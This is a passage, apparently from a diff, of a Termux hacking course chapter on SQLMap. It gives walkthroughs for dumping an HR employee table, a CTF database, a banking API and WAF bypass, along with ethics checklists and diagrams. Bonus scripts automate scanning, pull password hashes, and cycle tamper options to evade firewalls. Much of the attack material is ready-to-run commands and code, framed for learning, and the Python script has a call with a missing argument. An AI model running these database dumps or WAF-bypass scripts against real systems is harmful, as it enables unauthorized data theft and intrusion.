+║  # Step 2: Manual testing                                                  ║
+║  Burp Suite interception of login request                                  ║
+║  Saved request to login_request.txt                                        ║
+║                                                                             ║
+║  # Step 3: SQLMap testing                                                  ║
+║  sqlmap -r login_request.txt --batch --level=3                             ║
+║                                                                             ║
+║  # Step 4: Exploitation (if found)                                         ║
+║  sqlmap -r login_request.txt --dbs --batch                                 ║
+║  sqlmap -r login_request.txt -D hr_db --tables --batch                     ║
+║  sqlmap -r login_request.txt -D hr_db -T employees --dump --batch          ║
+║                                                                            ║
+║  FINDINGS:                                                                  ║
+║  • UNION-based SQLi in employee search                                     ║
+║  • 5000+ employee records exposed                                          ║
+║  • Passwords stored in plain text                                          ║
+║                                                                            ║
+║  REMEDIATION:                                                               ║
+║  • Immediate patching required                                             ║
+║  • Parameterized queries implementation                                    ║
+║  • Password hashing (bcrypt)                                               ║
+║  • WAF deployment                                                          ║
+║                                                                            ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 3: CTF Challenge
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                         CTF CHALLENGE                                       ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                            ║
+║  CHALLENGE: "Find the flag in the database"                                ║
+║                                                                            ║
+║  GIVEN:                                                                     ║
+║  • URL: http://ctf.challenge.com/vulnerable.php?id=1                       ║
+║  • Hint: "The flag is in the secrets table"                                ║
+║                                                                            ║
+║  APPROACH:                                                                  ║
+║  # Quick detection                                                          ║
+║  sqlmap -u "http://ctf.challenge.com/vulnerable.php?id=1" --batch          ║
+║                                                                             ║
+║  # Found: Boolean-based blind SQLi                                         ║
+║                                                                             ║
+║  # Enumerate databases                                                      ║
+║  sqlmap -u "url" --dbs --batch                                             ║
+║  # Output: ctf_db                                                           ║
+║                                                                             ║
+║  # List tables                                                              ║
+║  sqlmap -u "url" -D ctf_db --tables --batch                                ║
+║  # Output: secrets, users, products                                        ║
+║                                                                             ║
+║  # Dump secrets table                                                       ║
+║  sqlmap -u "url" -D ctf_db -T secrets --dump --batch                       ║
+║                                                                             ║
+║  FLAG FOUND: CTF{sql_m4st3r_2024}                                          ║
+║                                                                            ║
+║  TIME: 3 minutes 22 seconds                                                ║
+║                                                                            ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 4: Mobile App API Testing
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     MOBILE APP API TESTING                                  ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                            ║
+║  TARGET: Mobile banking app REST API                                       ║
+║                                                                            ║
+║  SETUP:                                                                     ║
+║  • Intercept app traffic with Burp Suite                                   ║
+║  • Identify API endpoint: /api/v1/transactions?user_id=123                ║
+║  • Save request to api_request.txt                                         ║
+║                                                                            ║
+║  TESTING:                                                                   ║
+║  # Test with SQLMap                                                        ║
+║  sqlmap -r api_request.txt --batch --level=5                               ║
+║                                                                             ║
+║  # With authentication token                                               ║
+║  sqlmap -r api_request.txt \                                               ║
+║         --headers="Authorization: Bearer TOKEN" \                          ║
+║         --batch                                                            ║
+║                                                                             ║
+║  # Test specific parameter                                                  ║
+║  sqlmap -r api_request.txt -p user_id --batch                              ║
+║                                                                            ║
+║  FINDINGS:                                                                  ║
+║  • No SQL injection in user_id parameter                                   ║
+║  • Found SQLi in search parameter (secondary endpoint)                     ║
+║  • Sensitive data exposure via API                                         ║
+║                                                                            ║
+║  RECOMMENDATIONS:                                                           ║
+║  • Input validation on all API parameters                                  ║
+║  • Rate limiting implementation                                            ║
+║  • API key rotation mechanism                                              ║
+║  • Parameterized queries                                                   ║
+║                                                                            ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 5: WAF Bypass Challenge
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                      WAF BYPASS CHALLENGE                                   ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                            ║
+║  SITUATION:                                                                 ║
+║  Target has Web Application Firewall (WAF) blocking SQLMap requests        ║
+║                                                                            ║
+║  INITIAL ATTEMPT:                                                           ║
+║  sqlmap -u "https://target.com/page?id=1" --batch                          ║
+║  # Result: 403 Forbidden (WAF blocked)                                     ║
+║                                                                            ║
+║  BYPASS TECHNIQUES:                                                         ║
+║                                                                             ║
+║  # Technique 1: Tamper scripts                                             ║
+║  sqlmap -u "url" --tamper=space2comment,between --batch                    ║
+║                                                                             ║
+║  # Technique 2: Random User-Agent                                          ║
+║  sqlmap -u "url" --random-agent --batch                                    ║
+║                                                                             ║
+║  # Technique 3: Delay between requests                                     ║
+║  sqlmap -u "url" --delay=5 --batch                                         ║
+║                                                                             ║
+║  # Technique 4: Custom headers                                             ║
+║  sqlmap -u "url" --headers="X-Forwarded-For: 127.0.0.1" --batch            ║
+║                                                                             ║
+║  # Technique 5: HTTP methods                                               ║
+║  sqlmap -u "url" --method=POST --data="id=1" --batch                       ║
+║                                                                             ║
+║  # Technique 6: Chunked encoding                                           ║
+║  sqlmap -u "url" --chunked --batch                                         ║
+║                                                                            ║
+║  SUCCESSFUL BYPASS:                                                         ║
+║  Combination of tamper + random-agent + delay                              ║
+║                                                                            ║
+║  COMMAND THAT WORKED:                                                       ║
+║  sqlmap -u "url" --tamper=space2comment \                                  ║
+║         --random-agent --delay=3 --batch                                    ║
+║                                                                            ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## ⚠️ SECURITY BEST PRACTICES
+
+### ✅ DO's - Ethical SQL Injection Testing
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         SECURITY DO's                                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ✅ ALWAYS get written authorization before testing                         │
+│  ✅ TEST only in defined scope                                              │
+│  ✅ USE designated testing environments when available                      │
+│  ✅ DOCUMENT all findings for reporting                                     │
+│  ✅ NOTIFY stakeholders immediately if critical data exposed                │
+│  ✅ FOLLOW responsible disclosure practices                                 │
+│  ✅ CLEAN UP any test data created                                         │
+│  ✅ PROOF of concept only, limit data extraction                           │
+│  ✅ USE --batch for automated decisions                                     │
+│  ✅ START with low level/risk, increase as needed                           │
+│  ✅ VERIFY with multiple techniques                                         │
+│  ✅ REPORT with remediation recommendations                                 │
+│                                                                              │
+│  BEST PRACTICE: When in doubt, ask permission first                         │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### ❌ DON'Ts - Avoid These Mistakes
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         SECURITY DON'Ts                                      │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ❌ NEVER test websites without authorization                              │
+│  ❌ NEVER dump complete databases unless required                          │
+│  ❌ NEVER exfiltrate real user data                                        │
+│  ❌ NEVER use --risk=3 on production systems                               │
+│  ❌ NEVER share vulnerabilities publicly before patch                       │
+│  ❌ NEVER attempt to modify/delete data                                    │
+│  ❌ NEVER run automated scans during peak hours                            │
+│  ❌ NEVER ignore rate limiting signs                                       │
+│  ❌ NEVER test third-party hosted applications                            │
+│  ❌ NEVER use default settings on critical systems                         │
+│  ❌ NEVER forget to save evidence                                          │
+│  ❌ NEVER test outside engagement window                                   │
+│                                                                              │
+│  WARNING: SQL injection testing on unauthorized systems is illegal          │
+│           and can result in severe criminal penalties                       │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### 🔒 SQLMap Safety Checklist
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      SQLMAP SAFETY CHECKLIST                                 │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  Before Testing:                                                             │
+│  ☐ Written authorization obtained                                           │
+│  ☐ Scope clearly defined                                                    │
+│  ☐ Rules of engagement signed                                               │
+│  ☐ Test window confirmed                                                    │
+│  ☐ Backup strategy in place                                                 │
+│                                                                              │
+│  During Testing:                                                             │
+│  ☐ Start with --level=1 --risk=1                                            │
+│  ☐ Use --batch for non-interactive                                          │
+│  ☐ Monitor for system impact                                                │
+│  ☐ Limit data extraction                                                    │
+│  ☐ Document all activities                                                  │
+│                                                                              │
+│  After Testing:                                                              │
+│  ☐ Report generated                                                         │
+│  ☐ Vulnerabilities explained                                                │
+│  ☐ Remediation provided                                                     │
+│  ☐ Test data cleaned up                                                     │
+│  ☐ Findings reported responsibly                                            │
+│                                                                              │
+│  Emergency:                                                                  │
+│  ☐ Stop testing if system unstable                                          │
+│  ☐ Notify immediately if data breach                                        │
+│  ☐ Document incident                                                        │
+│  ☐ Preserve evidence                                                        │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 📊 ARCHITECTURE DIAGRAMS
+
+### Diagram 1: SQL Injection Attack Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     SQL INJECTION ATTACK FLOW                                │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌──────────────┐                                                          │
+│   │   ATTACKER   │                                                          │
+│   │  (SQLMap)    │                                                          │
+│   └──────┬───────┘                                                          │
+│          │                                                                   │
+│          │ HTTP Request with Malicious Payload                              │
+│          │                                                                   │
+│          ▼                                                                   │
+│   ┌──────────────────────────────────────────────────────────────────────┐  │
+│   │                         WEB SERVER                                  │  │
+│   │  ┌────────────────────────────────────────────────────────────────┐ │  │
+│   │  │                   APPLICATION LAYER                            │ │  │
+│   │  │                                                                │ │  │
+│   │  │  User Input: id=1' OR '1'='1                                  │ │  │
+│   │  │                    ↓                                           │ │  │
+│   │  │  $query = "SELECT * FROM products WHERE id = '" + input + "'";  │ │  │
+│   │  │                    ↓                                           │ │  │
+│   │  │  VULNERABLE CODE (No sanitization!)                            │ │  │
+│   │  └────────────────────────────────────────────────────────────────┘ │  │
+│   └──────────────────────────────────────────────────────────────────────┘  │
+│          │                                                                   │
+│          │ SQL Query: SELECT * FROM products WHERE id = '1' OR '1'='1'      │
+│          │                                                                   │
+│          ▼                                                                   │
+│   ┌──────────────────────────────────────────────────────────────────────┐  │
+│   │                        DATABASE SERVER                              │  │
+│   │  ┌────────────────────────────────────────────────────────────────┐ │  │
+│   │  │                   DATABASE LAYER                               │ │  │
+│   │  │                                                                │ │  │
+│   │  │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐           │ │  │
+│   │  │   │   users     │  │  products   │  │   orders    │           │ │  │
+│   │  │   │─────────────│  │─────────────│  │─────────────│           │ │  │
+│   │  │   │ id, name,   │  │ id, name,   │  │ id, user_id │           │ │  │
+│   │  │   │ email, pass │  │ price, desc │  │ total, date │           │ │  │
+│   │  │   └─────────────┘  └─────────────┘  └─────────────┘           │ │  │
+│   │  └────────────────────────────────────────────────────────────────┘ │  │
+│   └──────────────────────────────────────────────────────────────────────┘  │
+│          │                                                                   │
+│          │ Data Exfiltration                                                 │
+│          ▼                                                                   │
+│   ┌──────────────┐                                                          │
+│   │  SENSITIVE   │                                                          │
+│   │    DATA      │                                                          │
+│   │ (Compromised)│                                                          │
+│   └──────────────┘                                                          │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 2: SQLMap Detection Process
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    SQLMAP DETECTION PROCESS                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                        PHASE 1: RECONNAISSANCE                       │   │
+│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
+│   │  │  • URL parsing                                             │   │   │
+│   │  │  • Parameter identification                                │   │   │
+│   │  │  • Cookie/Header analysis                                  │   │   │
+│   │  └─────────────────────────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                      │                                       │
+│                                      ▼                                       │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                     PHASE 2: FUZZING                                │   │
+│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
+│   │  │  • Inject various payloads                                  │   │   │
+│   │  │  • ' OR '1'='1, " OR "1"="1, ') OR ('1'='1                 │   │   │
+│   │  │  • Monitor response differences                             │   │   │
+│   │  └─────────────────────────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                      │                                       │
+│                                      ▼                                       │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                   PHASE 3: TECHNIQUE IDENTIFICATION                 │   │
+│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
+│   │  │   Test for:                                                 │   │   │
+│   │  │   • Error-based  (SQL errors in response)                   │   │   │
+│   │  │   • Union-based (UNION SELECT works)                        │   │   │
+│   │  │   • Boolean-based (True/False responses differ)             │   │   │
+│   │  │   • Time-based   (Response delays occur)                    │   │   │
+│   │  └─────────────────────────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                      │                                       │
+│                                      ▼                                       │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                    PHASE 4: DATABASE FINGERPRINT                    │   │
+│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
+│   │  │   Identify:                                                  │   │   │
+│   │  │   • Database type (MySQL, PostgreSQL, MSSQL, etc.)          │   │   │
+│   │  │   • Version                                                  │   │   │
+│   │  │   • User privileges                                          │   │   │
+│   │  └─────────────────────────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                      │                                       │
+│                                      ▼                                       │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                     PHASE 5: EXPLOITATION                           │   │
+│   │  ┌─────────────────────────────────────────────────────────────┐   │   │
+│   │  │   • Enumerate databases                                     │   │   │
+│   │  │   • Enumerate tables                                        │   │   │
+│   │  │   • Extract columns                                         │   │   │
+│   │  │   • Dump data                                               │   │   │
+│   │  │   • File operations (if privileged)                         │   │   │
+│   │  └─────────────────────────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 3: SQLMap vs Manual Testing Comparison
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                  SQLMAP VS MANUAL TESTING                                    │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌───────────────────────────────────┐  ┌───────────────────────────────┐  │
+│   │           SQLMap                  │  │       MANUAL TESTING          │  │
+│   │          (Automated)               │  │      (Human Expertise)        │  │
+│   ├───────────────────────────────────┤  ├───────────────────────────────┤  │
+│   │                                   │  │                               │  │
+│   │  ✓ Fast (1000s of payloads/sec)   │  │ ✓ Deep understanding          │  │
+│   │  ✓ Comprehensive coverage         │  │ ✓ Custom bypass techniques    │  │
+│   │  ✓ Multiple techniques auto       │  │ ✓ WAF bypass creativity       │  │
+│   │  ✓ Automatic fingerprint          │  │ ✓ Business logic flaws        │  │
+│   │  ✓ Session management             │  │ ✓ False positive verification │  │
+│   │  ✓ Resume capability              │  │ ✓ Documentation skills        │  │
+│   │  ✗ May trigger WAF/IDS            │  │ ✓ Complex scenarios           │  │
+│   │  ✗ Can miss logic flaws           │  │ ✗ Time consuming              │  │
+│   │  ✗ Generic payloads               │  │ ✗ Human error possible        │  │
+│   │  ✗ May overload target            │  │ ✗ Limited coverage            │  │
+│   │                                   │  │                               │  │
+│   └───────────────────────────────────┘  └───────────────────────────────┘  │
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                     RECOMMENDED APPROACH                            │   │
+│   │                                                                      │   │
+│   │   1. Manual reconnaissance → Understand the application              │   │
+│   │   2. SQLMap automated scan → Quick vulnerability identification     │   │
+│   │   3. Manual exploitation → Bypass WAF, complex scenarios            │   │
+│   │   4. SQLMap exploitation → Data extraction if manual fails          │   │
+│   │   5. Manual verification → Confirm findings                         │   │
+│   │                                                                      │   │
+│   │   COMBINATION = BEST RESULTS                                         │   │
+│   │                                                                      │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🏆 BONUS ADVANCED CONTENT
+
+### Advanced Technique 1: SQLMap API Automation
+
+```python
+#!/usr/bin/env python3
+"""
+SQLMap API Automation Script
+Uses SQLMap's REST API for automated scanning
+"""
+
+import requests
+import json
+import time
+
+SQLMAP_API_URL = "http://127.0.0.1:8775"
+
+def start_sqlmap_api():
+    """Start SQLMap API server"""
+    import subprocess
+    subprocess.Popen(["python", "sqlmapapi.py", "-s"])
+    time.sleep(3)
+
+def create_scan_task(target_url):
+    """Create a new scan task"""
+    endpoint = f"{SQLMAP_API_URL}/task/new"
+    response = requests.get(endpoint)
+    return response.json()["taskid"]
+
+def start_scan(task_id, target_url, options=None):
+    """Start scanning with given options"""
+    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/start"
+    
+    data = {
+        "url": target_url,
+        "level": 3,
+        "risk": 1,
+        "batch": True
+    }
+    
+    if options:
+        data.update(options)
+    
+    response = requests.post(endpoint, json=data)
+    return response.json()
+
+def get_scan_status(task_id):
+    """Check scan status"""
+    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/status"
+    response = requests.get(endpoint)
+    return response.json()
+
+def get_scan_results(task_id):
+    """Get scan results"""
+    endpoint = f"{SQLMAP_API_URL}/scan/{task_id}/data"
+    response = requests.get(endpoint)
+    return response.json()
+
+def run_automated_scan(target_url):
+    """Run complete automated scan"""
+    print(f"[*] Starting scan for: {target_url}")
+    
+    # Create task
+    task_id = create_scan_task()
+    print(f"[+] Task ID: {task_id}")
+    
+    # Start scan
+    result = start_scan(task_id, target_url)
+    print(f"[+] Scan started: {result}")
+    
+    # Monitor progress
+    while True:
+        status = get_scan_status(task_id)
+        print(f"[*] Status: {status['status']}")
+        
+        if status['status'] == 'terminated':
+            break
+        
+        time.sleep(5)
+    
+    # Get results
+    results = get_scan_results(task_id)
+    print("[+] Scan Results:")
+    print(json.dumps(results, indent=2))
+    
+    return results
+
+if __name__ == "__main__":
+    target = "http://target.com/page?id=1"
+    run_automated_scan(target)
+```
+
+### Advanced Technique 2: SQLMap + Burp Suite Integration
+
+```bash
+#!/bin/bash
+# SQLMap + Burp Suite Integration Script
+# Automates SQL injection testing from Burp requests
+
+BURP_REQUEST_FILE=$1
+OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p $OUTPUT_DIR
+
+echo "=== SQLMap + Burp Integration ==="
+
+# Function to run SQLMap with different techniques
+run_sqlmap() {
+    local technique=$1
+    local output_file=$2
+    
+    echo "[*] Testing with technique: $technique"
+    
+    sqlmap -r $BURP_REQUEST_FILE \
+           --technique=$technique \
+           --batch \
+           --level=3 \
+           --risk=1 \
+           --threads=4 \
+           -o $output_file \
+           2>&1 | tee "$OUTPUT_DIR/sqlmap_${technique}.log"
+}
+
+# Test all techniques
+for tech in B E U S T; do
+    run_sqlmap $tech "$OUTPUT_DIR/results_${tech}.txt"
+done
+
+# If vulnerable, enumerate
+if grep -q "Parameter.*appears to be injectable" $OUTPUT_DIR/*.log; then
+    echo "[!] SQL Injection detected!"
+    echo "[*] Enumerating databases..."
+    
+    sqlmap -r $BURP_REQUEST_FILE \
+           --dbs \
+           --batch \
+           --threads=4 \
+           2>&1 | tee "$OUTPUT_DIR/databases.txt"
+    
+    echo "[*] Checking for password hashes..."
+    sqlmap -r $BURP_REQUEST_FILE \
+           --passwords \
+           --batch \
+           2>&1 | tee "$OUTPUT_DIR/passwords.txt"
+fi
+
+echo "[+] Results saved in: $OUTPUT_DIR"
+```
+
+### Advanced Technique 3: Advanced WAF Bypass Techniques
+
+```bash
+#!/bin/bash
+# Advanced WAF Bypass Script for SQLMap
+# Multiple bypass techniques with automatic selection
+
+TARGET_URL=$1
+
+echo "=== SQLMap WAF Bypass Script ==="
+
+# Technique 1: Standard tamper scripts
+test_standard_tamper() {
+    echo "[*] Testing standard tamper scripts..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --tamper=space2comment \
+           --batch --level=1 --risk=1 \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: space2comment tamper works!"
+        return 0
+    fi
+}
+
+# Technique 2: Combined tampers
+test_combined_tamper() {
+    echo "[*] Testing combined tamper scripts..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --tamper=space2comment,between,randomcase \
+           --batch --level=2 --risk=1 \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: Combined tampers work!"
+        return 0
+    fi
+}
+
+# Technique 3: HTTP Parameter Pollution
+test_hpp() {
+    echo "[*] Testing HTTP Parameter Pollution..."
+    
+    # Add duplicate parameters
+    MODIFIED_URL="${TARGET_URL}&id=1"
+    
+    sqlmap -u "$MODIFIED_URL" \
+           --batch --level=2 \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: HPP bypass works!"
+        return 0
+    fi
+}
+
+# Technique 4: Case variation
+test_case_variation() {
+    echo "[*] Testing case variation..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --tamper=randomcase \
+           --batch \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: Case variation works!"
+        return 0
+    fi
+}
+
+# Technique 5: Encoding bypass
+test_encoding() {
+    echo "[*] Testing encoding bypass..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --tamper=charencode \
+           --batch \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: Encoding bypass works!"
+        return 0
+    fi
+}
+
+# Technique 6: Chunked encoding
+test_chunked() {
+    echo "[*] Testing chunked encoding..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --chunked \
+           --batch \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: Chunked encoding works!"
+        return 0
+    fi
+}
+
+# Technique 7: Time-based with delay
+test_time_based() {
+    echo "[*] Testing time-based with delay..."
+    
+    sqlmap -u "$TARGET_URL" \
+           --technique=T \
+           --time-sec=10 \
+           --delay=2 \
+           --batch \
+           2>&1 | grep -i "injectable"
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS: Time-based works!"
+        return 0
+    fi
+}
+
+# Run all techniques
+for func in test_standard_tamper test_combined_tamper test_hpp test_case_variation test_encoding test_chunked test_time_based; do
+    $func
+    if [ $? -eq 0 ]; then
+        echo "[+] WAF BYPASSED!"
+        exit 0
+    fi
+done
+
+echo "[-] All techniques failed. Manual testing required."
+```
+
+---
+
+## 📝 CHAPTER SUMMARY CHECKLIST
+
+### Knowledge Verification Checklist
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      CHAPTER 34 COMPLETION CHECKLIST                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  CORE CONCEPTS:                                                              │
+│  ☐ Understood SQL injection fundamentals                                   │
+│  ☐ Learned injection types (In-band, Blind, Out-of-band)                   │
+│  ☐ Installed SQLMap in Termux                                              │
+│  ☐ Mastered basic SQLMap commands                                          │
+│                                                                              │
+│  ENUMERATION:                                                               │
+│  ☐ Listed databases with --dbs                                              │
+│  ☐ Listed tables with --tables                                              │
+│  ☐ Listed columns with --columns                                            │
+│  ☐ Dumped data with --dump                                                  │
+│                                                                              │
+│  ADVANCED OPTIONS:                                                           │
+│  ☐ Used --level and --risk appropriately                                   │
+│  ☐ Tested POST requests with --data                                         │
+│  ☐ Used --cookies for authenticated testing                                │
+│  ☐ Applied tamper scripts for WAF bypass                                   │
+│  ☐ Tested with request files (-r)                                           │
+│                                                                              │
+│  TECHNIQUES:                                                                 │
+│  ☐ Tested Boolean-based blind                                              │
+│  ☐ Tested Time-based blind                                                 │
+│  ☐ Tested Union-based                                                      │
+│  ☐ Tested Error-based                                                      │
+│  ☐ Combined techniques with --technique                                     │
+│                                                                              │
+│  PRACTICAL SKILLS:                                                           │
+│  ☐ Set up vulnerable lab environment                                       │
+│  ☐ Practiced on DVWA/bWAPP                                                 │
+│  ☐ Performed database enumeration                                          │
+│  ☐ Extracted sensitive data                                                │
+│  ☐ Documented findings                                                     │
+│                                                                              │
+│  SECURITY AWARENESS:                                                         │
+│  ☐ Understood legal implications                                           │
+│  ☐ Know ethical testing guidelines                                         │
+│  ☐ Can recommend SQL injection prevention                                   │
+│  ☐ Understand responsible disclosure                                       │
+│                                                                              │
+│  FINAL ASSESSMENT:                                                           │
+│  ☐ Completed all quiz questions                                             │
+│  ☐ Reviewed interview questions                                             │
+│  ☐ Understood real-world scenarios                                          │
+│  ☐ Ready for Chapter 35: Metasploit                                        │
+│                                                                              │
+│  SCORE: _____/25 items completed                                            │
+│                                                                              │
+│  Next Steps:                                                                 │
+│  • Practice on vulnerable apps                                              │
+│  • Set up local test environment                                           │
+│  • Try WAF bypass techniques                                                │
+│  • Document your methodology                                                │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+**Chapter 34: SQLMap Basics - Complete! 🎉**
+
+*Enhanced content added for comprehensive learning experience*
+*Created by T3rmuxk1ng | Termux Full Course*
